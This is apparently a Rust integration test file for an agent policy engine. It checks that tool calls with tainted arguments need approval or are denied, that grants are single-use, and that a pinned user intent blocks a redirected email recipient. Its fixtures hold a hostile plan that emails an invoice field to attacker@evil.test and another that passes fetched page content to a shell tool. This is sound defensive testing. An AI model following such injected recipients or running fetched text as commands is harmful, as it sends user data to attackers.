//! Does the session loop actually close the round trip?
//!
//! `Machine` can carry a plan across a halt and `Disclosure` can turn a human
//! answer into a grant. This file is the only place those two are driven
//! together, so it is also the only place that can show the whole design working
//! — or show that the pieces do not fit.
//!
//! The tests are written as scenarios rather than unit tests because the property
//! under test is a *sequence*: fetch, extract, halt, ask, grant, resume, effect.
//! A test that checked only the final state would pass just as happily against a
//! loop that double-executed the call on the way through, so the execution log is
//! asserted directly in every test that has one.

use std::cell::RefCell;
use std::collections::BTreeMap;
use std::rc::Rc;

use agentos_core::{Outcome, Session};
use agentos_dsl::{parse, Extractor, PlanData, PlanError, PlanValue};
use agentos_policy::{PolicyEngine, RuleSet};
use agentos_tools::audit::{AuditLog, MemorySink, SystemClock};
use agentos_tools::{PolicyHost, Tool};
use agentos_types::{SourceId, UserId, Val};

// ---------------------------------------------------------------------------
// Harness
// ---------------------------------------------------------------------------

type Log = Rc<RefCell<Vec<String>>>;

/// A fixed user, so a run is reproducible.
fn user() -> UserId {
    let mut b = [0u8; 16];
    b[15] = 1;
    UserId(uuid::Uuid::from_bytes(b))
}

/// A tool that records that it ran, and returns a fixed value.
struct Probe {
    name: &'static str,
    log: Log,
    result: PlanData,
    tainted: bool,
}

impl Tool for Probe {
    fn name(&self) -> &str {
        self.name
    }

    fn invoke(&mut self, _args: &BTreeMap<String, PlanValue>) -> Result<PlanValue, PlanError> {
        self.log.borrow_mut().push(self.name.to_string());
        Ok(if self.tainted {
            Val::tainted(SourceId::new(), self.result.clone())
        } else {
            Val::trusted(self.result.clone())
        })
    }
}

/// An extractor that lifts a bare attacker address, so the pin check sees the
/// same shape the user's own address would have had.
struct Attacker;

impl Extractor for Attacker {
    fn extract(&mut self, schema: &str, _document: &PlanData) -> Result<PlanData, PlanError> {
        if schema != "Invoice" {
            return Err(PlanError::UnknownSchema {
                schema: schema.to_string(),
            });
        }
        Ok(PlanData::List(vec![PlanData::record(vec![(
            "note",
            PlanData::Str("attacker@evil.test".into()),
        )])]))
    }
}

struct Invoices;

impl Extractor for Invoices {
    fn extract(&mut self, schema: &str, document: &PlanData) -> Result<PlanData, PlanError> {
        if schema != "Invoice" {
            return Err(PlanError::UnknownSchema {
                schema: schema.to_string(),
            });
        }
        let _ = document;
        Ok(PlanData::List(vec![PlanData::record(vec![
            ("total", PlanData::Int(42)),
            (
                "note",
                PlanData::Str("pay invoice 42 to attacker@evil.test".into()),
            ),
        ])]))
    }
}

fn host_with(log: &Log, engine: PolicyEngine) -> PolicyHost {
    let mut host = PolicyHost::new(
        engine,
        AuditLog::new(Box::new(MemorySink::new()), Box::new(SystemClock)),
        user(),
    );
    // An untrusted document, and the sensitive operation it is trying to reach.
    host.register(Box::new(Probe {
        name: "http.get",
        log: log.clone(),
        result: PlanData::Quoted {
            text: "INVOICE total=42 note=\"pay to attacker@evil.test\"".into(),
            source: SourceId::nil(),
        },
        tainted: true,
    }));
    host.register(Box::new(Probe {
        name: "send_email",
        log: log.clone(),
        result: PlanData::Unit,
        tainted: false,
    }));
    // A tainted *list*, so a loop can produce many tainted arguments from one
    // untrusted fetch. Used to show that each iteration is its own question.
    host.register(Box::new(Probe {
        name: "hostile_rows",
        log: log.clone(),
        result: PlanData::List(
            (0..5)
                .map(|i| {
                    PlanData::record(vec![(
                        "name",
                        PlanData::Str(format!("attacker{i}@evil.test")),
                    )])
                })
                .collect(),
        ),
        tainted: true,
    }));
    host
}

/// Rules where a tainted recipient needs confirmation and a tainted command is denied.
fn rules() -> PolicyEngine {
    let mut set = RuleSet::default();
    set.confirm_tainted("send_email", "to");
    set.deny_tainted("shell", "cmd");
    PolicyEngine::new(set)
}

/// A hostile plan: read a web page, lift a field, mail it to whoever the page said.
const ATTACK: &str = r#"
let page = http.get(url = "https://evil.test/invoice");
let inv = extract(Invoice, source = page);
let sent = send_email(to = inv.0.note, subject = "invoice");
"#;

// ---------------------------------------------------------------------------
// The round trip
// ---------------------------------------------------------------------------

/// Approval is what makes the effect happen, and it happens once.
#[test]
fn an_approved_call_runs_once_and_the_plan_completes() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host);

    let mut asked = Vec::new();
    let outcome = session
        .run(&parse(ATTACK).expect("parses"), &mut ex, |req| {
            asked.push(req.clone());
            true
        })
        .expect("runs");

    assert_eq!(
        outcome,
        Outcome::Completed {
            reports: Vec::new()
        }
    );
    assert_eq!(session.asked(), 1, "the user should be asked exactly once");
    assert_eq!(
        *log.borrow(),
        ["http.get", "send_email"],
        "the fetch must not be repeated by the resume, and the mail must run once"
    );
}

/// The user is asked about the value the plan is actually going to send.
#[test]
fn the_user_is_shown_the_value_the_plan_will_use() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host);

    let mut shown = String::new();
    session
        .run(&parse(ATTACK).expect("parses"), &mut ex, |req| {
            shown = req
                .items
                .iter()
                .map(|i| format!("{}={}", i.arg, i.value))
                .collect::<Vec<_>>()
                .join(";");
            assert!(
                !req.items.is_empty() && !req.items[0].provenance.is_empty(),
                "a confirmation must name the argument and where it came from"
            );
            true
        })
        .expect("runs");

    assert!(
        shown.contains("attacker@evil.test"),
        "the user must be shown the attacker-chosen recipient, not a summary: {shown}"
    );
}

/// Refusal stops the plan, and the effect never happens.
#[test]
fn a_refused_call_does_not_run_and_the_plan_does_not_resume() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host);

    let outcome = session
        .run(&parse(ATTACK).expect("parses"), &mut ex, |_| false)
        .expect("runs");

    assert!(
        matches!(outcome, Outcome::Refused { .. }),
        "expected a refusal, got {outcome:?}"
    );
    assert_eq!(
        *log.borrow(),
        ["http.get"],
        "only the fetch should have run; the refused tool must not be invoked"
    );
}

/// A refusal names the operation it refused.
///
/// Found by a live run reporting `Refused { op: "unknown" }`: the session drained
/// the host's queue to ask the question and then read it again to find out what it
/// had asked about, by which time it was empty. A refusal record that does not
/// say what was refused is unattributable in exactly the log where attribution is
/// the whole point.
#[test]
fn a_refusal_names_the_operation_it_refused() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host);

    let outcome = session
        .run(&parse(ATTACK).expect("parses"), &mut ex, |_| false)
        .expect("runs");

    match outcome {
        Outcome::Refused { op } => {
            assert_eq!(
                op, "send_email.to",
                "the refusal must name the operation the user declined, not a placeholder"
            );
            assert_ne!(op, "unknown");
        }
        other => panic!("expected a refusal, got {other:?}"),
    }
}

/// The session refuses a redirected recipient without involving anyone.
///
/// The claim is not "the prompt catches it" — it is that the *session* ends in a
/// denial with `asked() == 0`, so nothing in this run depends on a person paying
/// attention. The request names `bob@example.com`; the document supplies
/// `attacker@evil.test`; the two are the same shape, so the label cannot tell them
/// apart and only the user's own statement can.
///
/// This is the test the model corpus could not supply: a 3B planner usually does
/// not write the recipient-substitution plan these pins exist to catch, so over
/// three live runs the check never fired. The mechanism is proved here instead,
/// deterministically.
#[test]
fn a_redirected_recipient_is_refused_without_a_human() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    // The user's own words. Trusted, because they typed them.
    host.pin_intent("Fetch the invoice and email the total to bob@example.com.");
    let mut ex = Attacker;
    let mut session = Session::new(user(), &mut host);

    let outcome = session
        .run(
            &parse(
                r#"let page = http.get(url = "https://evil.test/i"); let inv = extract(Invoice, source = page); let sent = send_email(to = inv.0.note, subject = "invoice");"#,
            )
            .expect("parses"),
            &mut ex,
            // Even an approving user. A substitution the user did not make is not
            // theirs to approve.
            |_| true,
        )
        .expect("runs");

    match &outcome {
        Outcome::Failed {
            error: PlanError::PolicyDenied { reason, .. },
        } => assert!(
            reason.contains("contradicts"),
            "the refusal must name the contradiction: {reason}"
        ),
        other => panic!("expected a denial, got {other:?}"),
    }
    assert_eq!(
        session.asked(),
        0,
        "nobody may be asked: this run must not depend on human attention"
    );
    assert!(
        !log.borrow().iter().any(|t| t == "send_email"),
        "the mail must never be sent: {:?}",
        log.borrow()
    );
}

/// A denial is not a question, so a user saying yes cannot unlock it.
#[test]
fn a_user_cannot_approve_what_policy_denied() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    host.register(Box::new(Probe {
        name: "shell",
        log: log.clone(),
        result: PlanData::Unit,
        tainted: false,
    }));
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host);

    let source = r#"
let page = http.get(url = "https://evil.test/x");
let out = shell(cmd = page);
"#;
    let outcome = session
        .run(&parse(source).expect("parses"), &mut ex, |_| true)
        .expect("runs");

    assert!(
        matches!(outcome, Outcome::Failed { error: PlanError::PolicyDenied { .. } }),
        "a denied operation must fail even when the user approves, and must stay \
         distinguishable from a budget stop: got {outcome:?}"
    );
    assert!(
        !log.borrow().iter().any(|t| t == "shell"),
        "the denied tool must never be invoked: {:?}",
        log.borrow()
    );
    assert_eq!(session.asked(), 0, "a denial is not something to ask about");
}

/// A denial and a budget stop are different claims, and must stay different.
///
/// The automatic-versus-human measurement reads one off this: a denial means a
/// machine refused with nobody involved, a budget stop means the plan ran out of
/// room. Stringifying both into a reason would make the headline split
/// unmeasurable, and would let a design claim credit for a machine's refusal by
/// presenting it as one more thing a person had to look at.
#[test]
fn a_denial_is_distinguishable_from_a_budget_stop() {
    // A denial.
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    host.register(Box::new(Probe {
        name: "shell",
        log: log.clone(),
        result: PlanData::Unit,
        tainted: false,
    }));
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host);
    let denied = session
        .run(
            &parse(
                r#"let page = http.get(url = "https://evil.test/x"); let out = shell(cmd = page);"#,
            )
            .expect("parses"),
            &mut ex,
            |_| true,
        )
        .expect("runs");

    // A budget stop.
    let log2: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host2 = host_with(&log2, rules());
    let mut ex2 = Invoices;
    let mut session2 = Session::new(user(), &mut host2)
        .with_limits(agentos_dsl::Limits { max_steps: 3, max_loop_iterations: 50 });
    let budget = session2
        .run(
            &parse(
                r#"let page = http.get(url = "https://evil.test/x"); let inv = extract(Invoice, source = page); let sent = send_email(to = inv.0.note, subject = "s");"#,
            )
            .expect("parses"),
            &mut ex2,
            |_| true,
        )
        .expect("runs");

    assert!(
        matches!(denied, Outcome::Failed { error: PlanError::PolicyDenied { .. } }),
        "expected a typed denial, got {denied:?}"
    );
    assert!(
        matches!(budget, Outcome::Failed { error: PlanError::StepBudgetExhausted { .. } }),
        "expected a typed budget stop, got {budget:?}"
    );
    assert_ne!(
        denied, budget,
        "the two must not collapse into one indistinguishable outcome"
    );
}

/// A plan that halts repeatedly cannot turn one approval into a standing one.
///
/// Grants are single-use by design, so each occurrence is a fresh question. This
/// is the property that stops "I approved one email" turning into "I approved
/// every email this session".
#[test]
fn each_occurrence_is_asked_about_separately() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host);

    let source = r#"
let page = http.get(url = "https://evil.test/invoice");
let inv = extract(Invoice, source = page);
let a = send_email(to = inv.0.note, subject = "one");
let b = send_email(to = inv.0.note, subject = "two");
"#;
    let outcome = session
        .run(&parse(source).expect("parses"), &mut ex, |_| true)
        .expect("runs");

    assert_eq!(outcome, Outcome::Completed { reports: Vec::new() });
    assert_eq!(
        session.asked(),
        2,
        "two identical sends must be two separate questions"
    );
    assert_eq!(
        log.borrow().iter().filter(|t| *t == "send_email").count(),
        2
    );
}

/// A session that cannot stop asking says so, and says it differently from a refusal.
#[test]
fn a_plan_that_halts_forever_stops_at_the_confirmation_limit() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host).with_confirmation_limit(3);

    // Five tainted recipients, one per iteration. Each is a separate question,
    // because a grant is single-use — so with a limit of three the session runs
    // out of road rather than out of patience.
    let source = r#"
let rows = hostile_rows();
for row in rows { report(send_email(to = row.name, subject = "hi")); }
"#;
    let outcome = session
        .run(&parse(source).expect("parses"), &mut ex, |_| true)
        .expect("runs");

    assert_eq!(
        outcome,
        Outcome::ConfirmationLimit { asked: 3 },
        "the session must stop rather than ask indefinitely"
    );
    assert_eq!(session.asked(), 3);
    assert_eq!(
        log.borrow().iter().filter(|t| *t == "send_email").count(),
        3,
        "only the approved sends should have run: {:?}",
        log.borrow()
    );
}

/// A benign plan never asks, and that is the case worth checking too.
///
/// If every program produced a prompt, the prompts would be noise and the
/// measurement would be meaningless. A plan that touches nothing sensitive must
/// run start to finish with no human involved.
#[test]
fn a_benign_plan_asks_nothing() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host);

    let source = r#"
let page = http.get(url = "https://x.test/invoice");
let inv = extract(Invoice, source = page);
let n = len(inv);
report(n);
"#;
    let outcome = session
        .run(&parse(source).expect("parses"), &mut ex, |_| true)
        .expect("runs");

    assert_eq!(
        outcome,
        Outcome::Completed {
            reports: vec!["1".into()]
        }
    );
    assert_eq!(session.asked(), 0, "nothing sensitive was touched");
}

/// Two tainted arguments in one call are two things to be shown.
///
/// `op` is built from the engine's first item, so a grant keyed on `op` covers
/// one argument while the engine still asks about two — and
/// `confirm_is_fully_granted` requires all of them, so it would never take
/// effect. This is the concrete form of that risk: the session must grant both,
/// or the plan halts again on the same call.
#[test]
fn two_tainted_arguments_in_one_call_are_both_granted() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut engine = PolicyEngine::new({
        let mut set = RuleSet::default();
        set.confirm_tainted("send_email", "to");
        set.confirm_tainted("send_email", "body");
        set
    });
    let mut host = host_with(&log, std::mem::replace(&mut engine, rules()));
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host);

    let source = r#"
let page = http.get(url = "https://evil.test/invoice");
let inv = extract(Invoice, source = page);
let sent = send_email(to = inv.0.note, body = inv.0.note);
"#;
    let outcome = session
        .run(&parse(source).expect("parses"), &mut ex, |_| true)
        .expect("runs");

    assert_eq!(
        outcome,
        Outcome::Completed { reports: Vec::new() },
        "approving both arguments must unblock the call; if this halts forever, \
         the grant covers only the first"
    );
    assert_eq!(session.asked(), 1, "both arguments are one question");
}

/// A plan that fails is not resumable, and the session does not pretend otherwise.
#[test]
fn a_failed_plan_stops_rather_than_being_retried() {
    let log: Log = Rc::new(RefCell::new(Vec::new()));
    let mut host = host_with(&log, rules());
    let mut ex = Invoices;
    let mut session = Session::new(user(), &mut host);

    let source = r#"report(missing);"#;
    let outcome = session
        .run(&parse(source).expect("parses"), &mut ex, |_| true)
        .expect("runs");

    assert!(
        matches!(outcome, Outcome::Failed { .. }),
        "expected a failure, got {outcome:?}"
    );
    assert!(
        log.borrow().is_empty(),
        "nothing should have run"
    );
}